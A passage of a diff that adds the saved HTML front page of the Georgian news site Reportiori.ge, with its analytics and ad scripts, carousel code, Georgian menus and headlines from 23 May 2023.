@@ -1,0 +1,3864 @@
+<html xmlns="http://www.w3.org/1999/xhtml"><head>
+
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    
+    <title>Reportiori.ge</title>
+    
+    <link rel="Shortcut Icon" type="image/ico" href="favicon.ico">
+    <link rel="shortcut icon" href="images/icon.png" type="image/x-icon">
+    
+    <link href="css/style.css" rel="stylesheet" type="text/css">
+    
+    <script src="https://connect.facebook.net/en_GB/sdk.js?hash=84770335f6187b5b17c97bd45bc1f56c" async="" crossorigin="anonymous"></script><script async="" type="text/javascript" src="https://servedbyadbutler.com/app.js"></script><script async="" src="https://www.google-analytics.com/analytics.js"></script><script id="facebook-jssdk" src="//connect.facebook.net/en_GB/sdk.js#xfbml=1&amp;version=v2.6&amp;appId=1007871749287418"></script><script type="text/javascript" src="js/jquery.js"></script>
+    
+    <script type="text/javascript" src="js/cookie.js"></script>
+    
+    <!-- <script type="text/javascript" src="js/snow.js"></script> -->
+    
+    
+    <script src="js/geoKeyB.js"></script>
+    <script type="text/javascript" src="js/scrolltop.js"></script>
+     <script type="text/javascript" src="js/jquery.jcarousel.min.js"></script>
+     <script type="text/javascript" src="js/expand.js"></script>
+    
+    
+    
+    
+    
+    <script type="text/javascript">
+    
+     jQuery(document).ready(function(){
+        
+         
+    
+        $('.jcarousel').jcarousel({
+    
+           wrap: 'circular',
+           animation: {
+            duration: 300
+            
+            }
+           
+    
+        });
+    
+         $('.jcarousel').on('jcarousel:animate', function (event, carousel) {
+            $(carousel._element.context).find('li').toggle().fadeIn(0);
+        });
+    
+        $('.main_carousel').jcarousel({
+    
+           wrap: 'circular',
+           animation: {
+            duration: 1
+            
+            }
+           
+    
+        });
+    
+         $('.main_carousel').on('jcarousel:animate', function (event, carousel) {
+            $(carousel._element.context).find('li').toggle().fadeIn(800);
+        });
+    
+    
+        $("#highlite_carousel").jcarouselAutoscroll({
+    
+                interval: 6000,
+    
+                target: '+=1',
+    
+                autostart: true
+    
+      });
+    
+      $("#highlite_carousel1").jcarouselAutoscroll({
+    
+                interval: 6000,
+    
+                target: '+=1',
+    
+                autostart: true
+    
+      });
+    
+      $("#highlite_carousel1_2").jcarouselAutoscroll({
+    
+                interval: 6000,
+    
+                target: '+=1',
+    
+                autostart: true
+    
+      });
+    
+      $("#highlite_carousel2").jcarouselAutoscroll({
+    
+                interval: 6000,
+    
+                target: '+=1',
+    
+                autostart: true
+    
+      });
+    
+    
+    
+       $("#highlite_carousel2_2").jcarouselAutoscroll({
+    
+                interval: 6000,
+    
+                target: '+=1',
+    
+                autostart: true
+    
+      });
+    
+      $("#highlite_carousel2_3").jcarouselAutoscroll({
+    
+                interval: 6000,
+    
+                target: '+=1',
+    
+                autostart: true
+    
+      });
+    
+      $("#highlite_carousel2_4").jcarouselAutoscroll({
+    
+                interval: 6000,
+    
+                target: '+=1',
+    
+                autostart: true
+    
+      });
+    
+      $("#highlite_carousel2_5").jcarouselAutoscroll({
+    
+                interval: 6000,
+    
+                target: '+=1',
+    
+                autostart: true
+    
+      });
+    
+    
+    
+      $("#header_carusel").jcarouselAutoscroll({
+    
+                interval: 5000,
+    
+                target: '-=1',
+    
+                autostart: true
+    
+      });
+    
+         $('#main_carousel').jcarouselAutoscroll({
+    
+                interval: 6000,
+    
+                target: '+=1',
+    
+                autostart: true
+    
+            })
+    
+        ;
+    
+        
+    
+         $('.pages').jcarouselPagination({
+    
+            
+            item: function(page) {
+              if (page == 1) 
+                return '<li class="active_page"><a href="#' + page + '">' + page + '</a></li>';
+              return '<li><a href="#' + page + '">' + page + '</a></li>';
+    
+            }
+    
+        });
+        $('.pages li a').click(function(){
+            $('#main_carousel').jcarouselAutoscroll('stop');
+        });
+         $( ".jcarousel" ).find( "li.prev" ).jcarouselControl({
+    
+            target: '-=1'
+    
+        });
+        $( ".jcarousel" ).find( "a.hprev" ).jcarouselControl({
+    
+            target: '-=1'
+    
+        });
+        $( ".jcarousel" ).find( "a.hnext" ).jcarouselControl({
+    
+            target: '+=1'
+    
+        });
+    
+        $('.jcarousel').find( "li.next" ).jcarouselControl({
+    
+            target: '+=1'
+    
+        });
+    
+        $('.pages').on('jcarouselpagination:active', 'li', function() {
+    
+    
+        $(this).addClass('active_page');
+    
+    });
+    
+        $('.pages').on('jcarouselpagination:inactive', 'li', function() {
+    
+            $(this).removeClass('active_page');
+    
+        });
+    
+         });
+    
+    </script>
+    
+    
+    
+    <!--    <script type="text/javascript">
+        
+       $(window).scroll(function() {
+            $(".footer").each( function() {
+              var wh = $( window ).height();
+                if( $(window).scrollTop() > $(this).offset().top - wh) {
+                    $(".side_tree").css('bottom','200px');
+                } else {
+                    $(".side_tree").css('bottom','0');
+                    
+                }
+            }); 
+        });
+    
+    
+    
+    </script> -->
+      
+    
+    
+    
+    
+    
+     
+    
+    
+    
+    <script>(function(d, s, id) {
+      var js, fjs = d.getElementsByTagName(s)[0];
+      if (d.getElementById(id)) return;
+      js = d.createElement(s); js.id = id;
+      js.src = "//connect.facebook.net/en_GB/sdk.js#xfbml=1&version=v2.6&appId=1007871749287418";
+      fjs.parentNode.insertBefore(js, fjs);
+    }(document, 'script', 'facebook-jssdk'));</script>
+    
+    
+    
+    <script>
+      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+      })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+    
+      ga('create', 'UA-42954002-1', 'auto');
+      ga('send', 'pageview');
+    
+    </script>
+    
+    
+    
+    
+    
+    </head>
+    
+    
+    
+    <body id="body" style="background-image:url('admin/backaground_photo.jpeg');">
+    
+    
+    
+    
+    <div id="fb-root"></div>
+    
+    <span id="output"></span>
+    
+    
+    
+    <div class="pre_header" style="height: 130px;">
+      <div class="content">
+    
+    
+    
+              <!--   <script>
+                $( document ).ready(function() {
+                  var links = ["https://www.facebook.com/GOGLICHIDZEGIORGI",
+                               "https://www.facebook.com/ZAURDARGALI",
+                               "https://www.facebook.com/BERIDZEVAKHTANG",
+                               "https://www.facebook.com/MODEBADZEGIVI",
+                               "https://www.facebook.com/GDGIORGISHENGELIA",
+                               "https://www.facebook.com/KAKHADZELADO"
+                               ];      
+    
+                  var banners = ["http://reportiori.ge/img/41/1.png",
+                                 "http://reportiori.ge/img/41/2.png",
+                                 "http://reportiori.ge/img/41/3.png",
+                                 "http://reportiori.ge/img/41/4.png",
+                                 "http://reportiori.ge/img/41/5.png",
+                                 "http://reportiori.ge/img/41/6.png"
+                                 ];             
+    
+                    var x = Math.floor((Math.random() * 7));
+                      var lnk = links[x];
+                      var img = banners[x];
+                      $('#banner_link').attr("href", lnk);
+                      $('#banner_image').attr("src", img);
+    
+                    setInterval(function(){
+                      var x = Math.floor((Math.random() * 7));
+                      var lnk = links[x];
+                      var img = banners[x];
+                      $('#banner_link').attr("href", lnk);
+                      $('#banner_image').attr("src", img);
+                    }, 5000);
+    
+                  });
+                </script>
+    
+    
+               <div style="padding-top: 8px;">
+                     <a  target="_blank" id="banner_link">
+                        <img itemprop="image" id="banner_image" style="height: 100px; width: 1012px; ">
+    
+                      </a>
+                    </div> -->
+    
+      
+       <div class="left_wing" style="margin-top: 8px;width: 1012px;"> 
+    
+        
+    
+    
+    
+        
+            <iframe width="1012" height="114" frameborder="0" scrolling="no" src="https://trgde.adocean.pl/_[TIMESTAMP]/ad.html?id=f2msFammTaWTs4jvfB88fiXY7KWFVl.3eivW5OXXdKX.g7/nc=0/gdpr=0/gdpr_consent=/redir="></iframe>
+      
+            <!-- <a href="" target="_blank" style="display: block;float: left;">
+             <img src="uploads/banner_173.psb?w=1012&h=114" width="1012" height="114">
+    
+           </a> -->
+    
+            <!-- <a href="http://gd.ge/" target="_blank" style="display: block;float: left;">
+              <img src="img/1012X114.gif?w=1012&h=114" width="1012" height="114">
+    
+            </a> -->
+    
+             
+              <!-- <iframe src="https://reportiori.ge/img/1012X114/index.html" width="1012" height="114"></iframe> -->
+          
+         
+        </div> 
+    
+    
+      </div>
+    </div>
+    <div class="fixedsocial">
+    
+        <a href="https://www.facebook.com/reportior" target="_blank"><img src="images/fb_side.png"></a>
+    
+        <a href="  https://www.youtube.com/user/reportiori" target="_blank"><img src="images/youtube_side.png"></a>
+    
+        <a href="http://reportiori.ge/rss.php" target="_blank"><img src="images/rss_side.png"></a>
+    
+    </div>
+    
+    
+    
+    <div id="fixedalert">
+    
+        
+    
+        <div class="alertflat" style="display:none">
+            აქ წავა სათაური
+            <script>
+    
+             $(document).ready(function(){
+    
+    
+    
+              setInterval(function(){
+    
+                $("#output").load("blocks/myphpfile.php");
+    
+              }, 3000);
+    
+             })
+    
+             </script>
+    
+        </div>
+    
+        
+    
+    </div>
+    
+    
+    
+    <div class="header">
+    
+      <div class="header_top">
+    
+        <div class="content">
+    
+         <ul class="top_menu">
+    
+        <li><a href="http://reportiori.ge/old/" target="_blank"> საიტის ძველი ვერსია</a></li><li><a href="http://reportiori.ge/index.php?authors"> რეპორტიორები</a></li> 
+    
+            <li><a href="index.php?type=static&amp;id=13">ჩვენ შესახებ</a></li>
+    
+         
+    
+            <li><a href="index.php?type=static&amp;id=18">ბმულები</a></li>
+    
+         
+    
+            <li><a href="index.php?type=static&amp;id=19">რეკლამა</a></li>
+    
+         
+    
+            <li><a href="index.php?type=static&amp;id=20">კონტაქტი</a></li>
+    
+            
+    
+          </ul>
+    
+          <span class="soc_icons"> 
+            <a href="https://www.facebook.com/reportior" target="_blank"><img src="images/fb.png"></a> 
+            <a href="http://reportiori.ge/rss.php" target="_blank"><img src="images/rss.png"></a> 
+            <a href="https://www.youtube.com/user/Reportiori" target="_blank"><img src="images/youtube.png"></a> 
+          </span> 
+          <span class="lang_switch"> <a href="#"><img src="images/geo.png?w=24&amp;h=17" width="24" height="17" alt="geo_flag">
+    </a> <a href="#"><img src="images/eng.png?w=25&amp;h=17" width="25" height="17" alt="eng_flag">
+    </a> <a href="#"><img src="images/rus.png?w=26&amp;h=17" width="26" height="17" alt="rus_flag">
+    </a> </span> <span class="search_wrap">
+    
+          <form action="index.php?search_bar=">
+    
+            <input name="search_bar" type="text" size="22" onkeypress="{changeVal()};">
+    
+            <input type="submit" value=" ">
+    
+          </form>
+    
+          </span> </div>
+    
+      </div>
+    
+      <div class="header_mid">
+    
+        <div class="content"> <a class="logo_geo" href="index.php">
+          <img src="images/geo_logo.png" alt="logo_geo">
+     
+                <!-- <img src="img/tovli.png?w=335&h=0" style="position:absolute; z-index:100; margin-left: -345px; top: 150px;  display:inline-block; margin-right:10px;width: 335px;" />
+     -->
+        
+    
+        </a> 
+    
+         
+    
+        <span class="clock_wrap">
+    
+          <span id="clockdisplay" style="
+              color: #fff;
+              font-size: 35px;
+              margin-left: -88px;
+              margin-top:-10px;
+              position:absolute;
+              width: 160px;">21:39</span>
+    
+        <script>
+    
+           function renderTime() {
+    
+                var currentTime = new Date();
+    
+                var diem = "AM"
+    
+                var h = currentTime.getHours();
+    
+                var m = currentTime.getMinutes();
+    
+                
+    
+    
+    
+    
+    
+               
+    
+    
+    
+                if (h<10){
+    
+                    h = "0" + h;
+    
+    
+    
+                }
+    
+    
+    
+                if (m<10){
+    
+                    m = "0" + m;
+    
+    
+    
+                }
+    
+    
+    
+                
+    
+    
+    
+                var myClock = document.getElementById('clockdisplay')
+    
+                myClock.textContent = h + ":" + m ; 
+    
+                myClock.innerText = h + ":" + m ; 
+    
+                setTimeout(renderTime,1000);
+    
+                }
+    
+    
+    
+    
+    
+                renderTime(); 
+    
+    
+    
+         </script> 
+    
+        <br>
+    
+          <span class="clock_date">
+    
+           <script>
+    
+    
+    var d = new Date();
+    
+    var month = d.getMonth()+1;
+    var day = d.getDate();
+    
+    var kvir = d.getDay();   
+    var yyyy = d.getFullYear();
+    
+    if(month==1) {new_m = "იანვარი";}
+    if(month==2) {new_m = "თებერვალი";}
+    if(month==3) {new_m = "მარტი";}
+    if(month==4) {new_m = "აპრილი";}
+    if(month==5) {new_m = "მაისი";}
+    if(month==6) {new_m = "ივნისი";}
+    if(month==7) {new_m = "ივლისი";}
+    if(month==8) {new_m = "აგვისტო";}
+    if(month==9) {new_m = "სექტემბერი";}
+    if(month==10) {new_m = "ოქტომბერი";}
+    if(month==11) {new_m = "ნოემბერი";}
+    if(month==12) {new_m = "დეკემბერი";}
+    
+    
+    
+    if(kvir==0) {new_d = "კვირა";}
+    
+    if(kvir==1) {new_d = "ორშაბათი";}
+    
+    if(kvir==2) {new_d = "სამშაბათი";}
+    
+    if(kvir==3) {new_d = "ოთხშაბათი";}
+    
+    if(kvir==4) {new_d = "ხუთშაბათი";}
+    
+    if(kvir==5) {new_d = "პარასკევი";}
+    
+    if(kvir==6) {new_d = "შაბათი";}
+    
+    
+    document.write("<span style='font-size:14px;'>" + new_d + ". " + day + " " + new_m + ". " + yyyy  + "</span>");
+     
+    
+           </script><span style="font-size:14px;">სამშაბათი. 23 მაისი. 2023</span> 
+    
+          </span> </span> 
+          <a class="logo_eng" href="index.php">
+            <img src="images/eng_logo.png" alt="eng_logo">
+           
+                <!-- <img src="img/qudi.png?w=42&h=0" style="position:absolute; z-index:99; margin-left: -75px; top: 165px;  display:inline-block; margin-right:10px;width: 42px;" />
+     -->
+           
+          </a> 
+        </div>
+    
+      </div>
+    
+      <div class="header_bot">
+    
+        <div class="content">
+    
+        <ul class="main_menu">
+    
+        <!--main menu-->
+    
+             
+    
+                
+                <li>
+    
+                
+    
+                <a href="index.php?menuid=1">მთავარი</a>
+                </li>         
+    
+                 
+    
+                
+                <li>
+    
+                
+    
+                <a href="index.php?menuid=2">პოლიტიკა</a>
+                </li>         
+    
+                 
+    
+                
+                <li>
+    
+                
+    
+                <a href="index.php?menuid=3">საზოგადოება</a>
+                </li>         
+    
+                 
+    
+                
+                <li>
+    
+                
+    
+                <a href="index.php?menuid=4">სამართალი</a>
+                </li>         
+    
+                 
+    
+                
+                <li>
+    
+                
+    
+                <a href="index.php?menuid=11">ეკონომიკა</a>
+                </li>         
+    
+                 
+    
+                
+                <li>
+    
+                
+    
+                <a href="index.php?menuid=8">მსოფლიო</a>
+                </li>         
+    
+                 
+    
+                
+                <li>
+    
+                
+    
+                <a href="index.php?menuid=9">ანონსი</a>
+                </li>         
+    
+                 
+    
+                
+                <li>
+    
+                
+    
+                <a href="index.php?menuid=6">კულტურა</a>
+                </li>         
+    
+                 
+    
+                
+                <li>
+    
+                
+    
+                <a href="http://qartuliazri.ge/" target="_blank">QARTULIAZRI.GE</a>
+                </li>         
+    
+                 
+    
+                
+                <li style="cursor:pointer" class="triger">
+    
+                
+    
+                <a>სხვა</a>
+                </li>         
+    
+                  
+    
+        </ul>
+    
+         <!--main menu end-->
+    
+      
+    
+          <ul class="submenu">
+    
+          
+            <li><a href="index.php?menuid=163">ექსკლუზივი</a></li>
+    
+          
+            <li><a href="index.php?menuid=74">ინტერვიუ</a></li>
+    
+          
+            <li><a href="index.php?menuid=48">ანალიტიკა / პუბლიცისტიკა</a></li>
+    
+          
+            <li><a href="index.php?menuid=68">TV - პრეს - დაიჯესტი</a></li>
+    
+          
+            <li><a href="index.php?menuid=75">TV - რეპორტიორი</a></li>
+    
+          
+            <li><a href="index.php?menuid=129">ისტორია</a></li>
+    
+          
+            <li><a href="index.php?menuid=97">ART- რეპორტიორი</a></li>
+    
+          
+            <li><a href="index.php?menuid=66">TV - ვიდეო</a></li>
+    
+          
+            <li><a href="index.php?menuid=41">სპორტი</a></li>
+    
+          
+            <li><a href="index.php?menuid=7">რელიგია</a></li>
+    
+          
+            <li><a href="index.php?menuid=24">პრეს - კლუბი</a></li>
+    
+          
+            <li><a href="index.php?menuid=73">კვირის თემა</a></li>
+    
+          
+            <li><a href="index.php?menuid=43">კონფლიქტები</a></li>
+    
+          
+            <li><a href="index.php?menuid=42">რეგიონები</a></li>
+    
+          
+            <li><a href="index.php?menuid=67">ეს საინტერესოა</a></li>
+    
+          
+            <li><a href="index.php?menuid=77">ყვითელი</a></li>
+    
+          
+            <li><a href="index.php?menuid=100">მედიცინა</a></li>
+    
+          
+            <li><a href="index.php?menuid=99">კულინარია</a></li>
+    
+          
+            <li><a href="index.php?menuid=59">მედია</a></li>
+    
+          
+            <li><a href="index.php?menuid=101">FACEBOOK - NEWS</a></li>
+    
+          
+            <li><a href="index.php?menuid=33">"არქივიდან"</a></li>
+    
+          
+            <li><a href="index.php?menuid=62">რა მოხდა დღეს?...</a></li>
+    
+          
+            <li><a href="index.php?menuid=164">მთავარი რედაქტორის სვეტი</a></li>
+    
+          
+            <li><a href="index.php?menuid=165">TOP - ფრაზა</a></li>
+    
+          
+            <li><a href="index.php?menuid=166">ნაციზმის ანატომია</a></li>
+    
+          
+          </ul>
+    
+        </div>
+    
+      </div>
+    
+    </div>
+    
+    <div class="middle_wrap">
+    
+      <div style="text-align: center;">
+        <!-- Home Desktop [async] -->
+        <script type="text/javascript">if (!window.AdButler){(function(){var s = document.createElement("script"); s.async = true; s.type = "text/javascript";s.src = 'https://servedbyadbutler.com/app.js';var n = document.getElementsByTagName("script")[0]; n.parentNode.insertBefore(s, n);}());}</script>
+        <script type="text/javascript">
+        var AdButler = AdButler || {}; AdButler.ads = AdButler.ads || [];
+        var abkw = window.abkw || '';
+        var plc470942 = window.plc470942 || 0;
+        document.write('<'+'div id="placement_470942_'+plc470942+'"></'+'div>');
+        AdButler.ads.push({handler: function(opt){ AdButler.register(180004, 470942, [728,90], 'placement_470942_'+opt.place, opt); }, opt: { place: plc470942++, keywords: abkw, domain: 'servedbyadbutler.com', click:'CLICK_MACRO_PLACEHOLDER' }});
+        </script><div id="placement_470942_0"></div>
+    
+      </div>
+    
+      <div class="content" style="padding-bottom:8px">
+    
+        <div class="left_wing" style="margin-top:0">
+    
+          <div class="main_news_wrap"> 
+    
+    
+        <!-- <div  style="width: 200px; position: absolute; left: 50%; margin-left: -580px; z-index:99; top: -10px; display:block;">
+        <img src="img/fifqebi.png?w=200&h=0" style="width: 200px;" />
+    
+        </div> -->
+    
+    
+            
+                <!-- <img src="img/qudi.png?w=100&h=0" style="position:absolute; z-index:100; right:655px; top: -40px;  display:inline-block; margin-right:10px;width: 100px;" />
+     -->
+        
+    
+            <span class="category_mark left_sider" style="right: 100.5%;top: -15px;">დღის რეპორტაჟი</span>
+    
+          <!--home slider-->
+    
+          
+            <div class="jcarousel main_carousel" id="main_carousel" style="border:1px solid #d6d6d6;" data-jcarousel="true" data-jcarouselautoscroll="true">
+            
+            <ul class="carousel_wrap" style="left: -1060px; top: 0px;">
+    
+              
+    
+              
+              <li class="main_news" style="display: block;"><a href="inside.php?menuid=3&amp;id=208566"><img src="uploads/news_208566.jpg" alt="sampling"></a>
+            
+            <!--<a class="hprev" href="#"><img src="images/hprev.png?w=50&h=0" style="width:50px;height:50px" />
+    </a>
+            <a class="hnext" href="#"><img src="images/hnext.png?w=50&h=0" style="width:50px;height:50px" />
+    </a>-->
+                <div class="watermark">watermark</div>       
+    
+                  <div class="main_news_desc">
+    
+                    <div class="main_news_title" style="padding-bottom: 8px;">
+    
+                    <a href="inside.php?menuid=3&amp;id=208566" style="color:inherit;text-shadow: 0px 0px 8px rgba(0, 0, 0, 1);">მიმდინარე წელს, ვაკის რაიონში 104 სარეაბილიტაციო პროექტი დაფინანსდა</a>
+    
+                    
+                      <span class="main_news_date">23 მაისი. 2023.  17:25</span> 
+    
+                    </div>
+    
+    
+    
+                   
+    
+                   
+                  
+                    
+    
+                  </div>
+    
+    
+    
+              </li>
+    
+              
+              <li class="main_news" style="display: block;"><a href="inside.php?menuid=3&amp;id=208565"><img src="uploads/news_208565.jpg" alt="sampling"></a>
+            
+            <!--<a class="hprev" href="#"><img src="images/hprev.png?w=50&h=0" style="width:50px;height:50px" />
+    </a>
+            <a class="hnext" href="#"><img src="images/hnext.png?w=50&h=0" style="width:50px;height:50px" />
+    </a>-->
+                <div class="watermark">watermark</div>       
+    
+                  <div class="main_news_desc">
+    
+                    <div class="main_news_title" style="padding-bottom: 8px;">
+    
+                    <a href="inside.php?menuid=3&amp;id=208565" style="color:inherit;text-shadow: 0px 0px 8px rgba(0, 0, 0, 1);">შალვა პაპუაშვილმა იაპონიის ელჩთან გამოსამშვიდობებელი შეხვედრა გამართა</a>
+    
+                    
+                      <span class="main_news_date">23 მაისი. 2023.  16:58</span> 
+    
+                    </div>
+    
+    
+    
+                   
+    
+                   
+                  
+                    
+    
+                  </div>
+    
+    
+    
+              </li>
+    
+              
+              <li class="main_news" style="display: block;"><a href="inside.php?menuid=3&amp;id=208564"><img src="uploads/news_208564.jpg" alt="sampling"></a>
+            
+            <!--<a class="hprev" href="#"><img src="images/hprev.png?w=50&h=0" style="width:50px;height:50px" />
+    </a>
+            <a class="hnext" href="#"><img src="images/hnext.png?w=50&h=0" style="width:50px;height:50px" />
+    </a>-->
+                <div class="watermark">watermark</div>       
+    
+                  <div class="main_news_desc">
+    
+                    <div class="main_news_title" style="padding-bottom: 8px;">
+    
+                    <a href="inside.php?menuid=3&amp;id=208564" style="color:inherit;text-shadow: 0px 0px 8px rgba(0, 0, 0, 1);">ვახტანგ გომელაური ანტიკორუფციული ბიუროს უფროსს - რაჟდენ კუპრაშვილს შეხვდა</a>
+    
+                    
+                      <span class="main_news_date">23 მაისი. 2023.  16:55</span> 
+    
+                    </div>
+    
+    
+    
+                   
+    
+                   
+                  
+                    
+    
+                  </div>
+    
+    
+    
+              </li>
+    
+              
+              <li class="main_news" style="display: block;"><a href="inside.php?menuid=4&amp;id=208563"><img src="uploads/news_208563.jpg" alt="sampling"></a>
+            
+            <!--<a class="hprev" href="#"><img src="images/hprev.png?w=50&h=0" style="width:50px;height:50px" />
+    </a>
+            <a class="hnext" href="#"><img src="images/hnext.png?w=50&h=0" style="width:50px;height:50px" />
+    </a>-->
+                <div class="watermark">watermark</div>       
+    
+                  <div class="main_news_desc">
+    
+                    <div class="main_news_title" style="padding-bottom: 8px;">
+    
+                    <a href="inside.php?menuid=4&amp;id=208563" style="color:inherit;text-shadow: 0px 0px 8px rgba(0, 0, 0, 1);">პროკურატურამ სოფელ ვაზისუბანში ჩადენილი განზრახ მკვლელობის ფაქტზე ერთ პირს ბრალდება წარუდგინა</a>
+    
+                    
+                      <span class="main_news_date">23 მაისი. 2023.  16:44</span> 
+    
+                    </div>
+    
+    
+    
+                   
+    
+                   
+                  
+                    
+    
+                  </div>
+    
+    
+    
+              </li>
+    
+              
+              <li class="main_news" style="display: block;"><a href="inside.php?menuid=3&amp;id=208562"><img src="uploads/news_208562.jpg" alt="sampling"></a>
+            
+            <!--<a class="hprev" href="#"><img src="images/hprev.png?w=50&h=0" style="width:50px;height:50px" />
+    </a>
+            <a class="hnext" href="#"><img src="images/hnext.png?w=50&h=0" style="width:50px;height:50px" />
+    </a>-->
+                <div class="watermark">watermark</div>       
+    
+                  <div class="main_news_desc">
+    
+                    <div class="main_news_title" style="padding-bottom: 8px;">
+    
+                    <a href="inside.php?menuid=3&amp;id=208562" style="color:inherit;text-shadow: 0px 0px 8px rgba(0, 0, 0, 1);">გმირთა მოედანზე საქართველოს ეროვნული გმირის, გენო ადამიას ბიუსტი დაიდგა</a>
+    
+                    
+                      <span class="main_news_date">23 მაისი. 2023.  16:38</span> 
+    
+                    </div>
+    
+    
+    
+                   
+    
+                   
+                  
+                    
+    
+                  </div>
+    
+    
+    
+              </li>
+    
+              
+              <li class="main_news" style="display: block;"><a href="inside.php?menuid=101&amp;id=208560"><img src="uploads/news_208560.jpg" alt="sampling"></a>
+            
+            <!--<a class="hprev" href="#"><img src="images/hprev.png?w=50&h=0" style="width:50px;height:50px" />
+    </a>
+            <a class="hnext" href="#"><img src="images/hnext.png?w=50&h=0" style="width:50px;height:50px" />
+    </a>-->
+                <div class="watermark">watermark</div>       
+    
+                  <div class="main_news_desc">
+    
+                    <div class="main_news_title" style="padding-bottom: 8px;">
+    
+                    <a href="inside.php?menuid=101&amp;id=208560" style="color:inherit;text-shadow: 0px 0px 8px rgba(0, 0, 0, 1);">დიმიტრი ხუნდაძე: აფხაზეთი საქართველოა და საქართველო აფხაზეთისაა! ამ ერთობას არაფერზე  ვცვლით!</a>
+    
+                    
+                      <span class="main_news_date">23 მაისი. 2023.  16:31</span> 
+    
+                    </div>
+    
+    
+    
+                   
+    
+                   
+                  
+                    
+    
+                  </div>
+    
+    
+    
+              </li>
+    
+              
+              <li class="main_news" style="display: block;"><a href="inside.php?menuid=101&amp;id=208558"><img src="uploads/news_208558.jpg" alt="sampling"></a>
+            
+            <!--<a class="hprev" href="#"><img src="images/hprev.png?w=50&h=0" style="width:50px;height:50px" />
+    </a>
+            <a class="hnext" href="#"><img src="images/hnext.png?w=50&h=0" style="width:50px;height:50px" />
+    </a>-->
+                <div class="watermark">watermark</div>       
+    
+                  <div class="main_news_desc">
+    
+                    <div class="main_news_title" style="padding-bottom: 8px;">
+    
+                    <a href="inside.php?menuid=101&amp;id=208558" style="color:inherit;text-shadow: 0px 0px 8px rgba(0, 0, 0, 1);">გია გაბრიჭიძე ელენე ხოშტარიაზე: პირადად უთხრა იმ სასტუმროს მფლობელმა, რომ სტუმრები უკვე წავიდნენო, მაგრამ არეულობის მოსაწყობი ბე უკვე აღებული ჰქონდა და უკან ხომ არ დააბრუნებდა?</a>
+    
+                    
+                      <span class="main_news_date">23 მაისი. 2023.  16:10</span> 
+    
+                    </div>
+    
+    
+    
+                   
+    
+                   
+                  
+                    
+    
+                  </div>
+    
+    
+    
+              </li>
+    
+              
+              <li class="main_news" style="display: block;"><a href="inside.php?menuid=101&amp;id=208559"><img src="uploads/news_208559.jpg" alt="sampling"></a>
+            
+            <!--<a class="hprev" href="#"><img src="images/hprev.png?w=50&h=0" style="width:50px;height:50px" />
+    </a>
+            <a class="hnext" href="#"><img src="images/hnext.png?w=50&h=0" style="width:50px;height:50px" />
+    </a>-->
+                <div class="watermark">watermark</div>       
+    
+                  <div class="main_news_desc">
+    
+                    <div class="main_news_title" style="padding-bottom: 8px;">
+    
+                    <a href="inside.php?menuid=101&amp;id=208559" style="color:inherit;text-shadow: 0px 0px 8px rgba(0, 0, 0, 1);">გია აბაშიძე: საქართველოს გულში დროებით დაკარგული აფხაზებისა და ოსების ჩახუტება ქართული სულის მქონეთა უმთავრესი პრიორიტეტია. ამ მამულიშვილურ საქმეში ნებისმიერი მავნებლური ინსინუაცია ე.წ. საგარეო-პოლიტიკურ კურსზე ყოველმხრივ ანტიქართულია!</a>
+    
+                    
+                      <span class="main_news_date">23 მაისი. 2023.  15:59</span> 
+    
+                    </div>
+    
+    
+    
+                   
+    
+                   
+                  
+                    
+    
+                  </div>
+    
+    
+    
+              </li>
+    
+              
+              <li class="main_news" style="display: block;"><a href="inside.php?menuid=101&amp;id=208557"><img src="uploads/news_208557.jpg" alt="sampling"></a>
+            
+            <!--<a class="hprev" href="#"><img src="images/hprev.png?w=50&h=0" style="width:50px;height:50px" />
+    </a>
+            <a class="hnext" href="#"><img src="images/hnext.png?w=50&h=0" style="width:50px;height:50px" />
+    </a>-->
+                <div class="watermark">watermark</div>       
+    
+                  <div class="main_news_desc">
+    
+                    <div class="main_news_title" style="padding-bottom: 8px;">
+    
+                    <a href="inside.php?menuid=101&amp;id=208557" style="color:inherit;text-shadow: 0px 0px 8px rgba(0, 0, 0, 1);">ნინო ფოჩხუა: თუ ჰგონიათ, რომ ამ სამშობლოს მოღალატეობრივ მესიჯს მხარდამჭერი ეყოლება, ძალიან ცდებიან</a>
+    
+                    
+                      <span class="main_news_date">23 მაისი. 2023.  15:48</span> 
+    
+                    </div>
+    
+    
+    
+                   
+    
+                   
+                  
+                    
+    
+                  </div>
+    
+    
+    
+              </li>
+    
+              
+              <li class="main_news" style="display: block;"><a href="inside.php?menuid=3&amp;id=208561"><img src="uploads/news_208561.jpg" alt="sampling"></a>
+            
+            <!--<a class="hprev" href="#"><img src="images/hprev.png?w=50&h=0" style="width:50px;height:50px" />
+    </a>
+            <a class="hnext" href="#"><img src="images/hnext.png?w=50&h=0" style="width:50px;height:50px" />
+    </a>-->
+                <div class="watermark">watermark</div>       
+    
+                  <div class="main_news_desc">
+    
+                    <div class="main_news_title" style="padding-bottom: 8px;">
+    
+                    <a href="inside.php?menuid=3&amp;id=208561" style="color:inherit;text-shadow: 0px 0px 8px rgba(0, 0, 0, 1);">ილია დარჩიაშვილი: პრემიერ-მინისტრი სამუშაო ვიზიტით იმყოფება კატარის სახელმწიფოში, მონაწილეობას იღებს კატარის საერთაშორისო ეკონომიკურ ფორუმში. პრემიერი ისაუბრებს ჩვენი ქვეყნის პოტენციალზე</a>
+    
+                    
+                      <span class="main_news_date">23 მაისი. 2023.  15:35</span> 
+    
+                    </div>
+    
+    
+    
+                   
+    
+                   
+                  
+                    
+    
+                  </div>
+    
+    
+    
+              </li>
+    
+              
+              <li class="main_news" style="display: block;"><a href="inside.php?menuid=3&amp;id=208556"><img src="uploads/news_208556.jpg" alt="sampling"></a>
+            
+            <!--<a class="hprev" href="#"><img src="images/hprev.png?w=50&h=0" style="width:50px;height:50px" />
+    </a>
+            <a class="hnext" href="#"><img src="images/hnext.png?w=50&h=0" style="width:50px;height:50px" />
+    </a>-->
+                <div class="watermark">watermark</div>       
+    
+                  <div class="main_news_desc">
+    
+                    <div class="main_news_title" style="padding-bottom: 8px;">
+    
